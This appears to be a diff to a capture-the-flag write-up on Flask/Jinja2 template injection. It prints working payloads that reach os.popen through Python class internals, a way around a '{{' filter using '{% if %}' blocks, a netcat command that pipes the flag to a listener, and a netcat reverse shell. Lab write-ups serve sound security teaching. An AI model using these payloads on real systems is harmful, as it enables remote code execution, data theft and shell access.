@@ -20,10 +20,10 @@
 
 ```python3
 # look at files
-{{ " ".__class__.__base__ .__subclasses__()[140].__init__.__globals__['sys'].modules['os'].popen('ls') }}
+{{ " ".__class__.__base__ .__subclasses__()[140].__init__.__globals__['sys'].modules['os'].popen('ls').read() }}
 
 # cat files
-{{ " ".__class__.__base__ .__subclasses__()[140].__init__.__globals__['sys'].modules['os'].popen('cat flag') }}
+{{ " ".__class__.__base__ .__subclasses__()[140].__init__.__globals__['sys'].modules['os'].popen('cat flag').read() }}
 ```
 #### Breaking down the payload
 1. Here, we are using an empty string and getting the `<class 'str'>` class
@@ -46,3 +46,24 @@
 ## Level 2
 * Immediately, it looks like even something as basic as `{{7 + 7}}` or `{{7}}` returns `Hello WAF`
 	* Testing more, it looks like `{{` in particular is a blocked string
+
+* We can bypass this, as flask has [more than one](https://flask.palletsprojects.com/en/2.0.x/tutorial/templates/) template type
+	* For example, there is a `{%%}` template that is used for conditional checks
+	* Unfortunately, this doesn't display anything, so our RCE is completely blind.
+
+* To account for this, we're going to cat our output with the command `cat flag | nc 127.0.0.1 4444`
+	* We can listen for a connection with `nc -lvnp 4444` locally
+
+* Alternatively, we can also try to run a reverse shell using the command `nc -e /bin/sh 127.0.0.1 4444`
+	* This serves a shell to localhost (our machine) on port 4444
+	
+* Here's the payload I used:
+```python3
+{% if url_for.__globals__.os.popen('cat flag | nc 127.0.0.1 4444').read() == 'blah' %}{% endif %}
+
+```
+#### Breaking down the payload
+1. This checks to see if the condition `url_for.__globals__.os.popen('cat flag | nc 127.0.0.1 4444').read() == 'blah'` is true
+	1. In this case, we know the output won't be 'blah', but the command still executes
+2. Everything between `{% if %}` and `{% endif %}` is what would typically execute if the condition was true, but we don't have to worry about that here.
+
